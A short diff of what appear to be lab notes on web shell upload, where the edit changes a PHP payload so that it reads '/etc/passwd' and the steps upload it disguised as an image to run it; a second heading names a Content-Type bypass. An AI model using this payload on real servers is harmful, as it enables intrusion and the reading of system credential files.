@@ -1,5 +1,5 @@
                 #Remote code execution via web shell upload#
-1.write a code (<?php echo file_get_contents('/path/to/target/file '); ?>) and save it as php.
+1.create a file and give this code (<?php echo file_get_contents('/etc/passwd '); ?>) and save it as php.
 2.upload this php file as a image . this excute and find a code 
  
 			#Web shell upload via Content-Type restriction bypass#
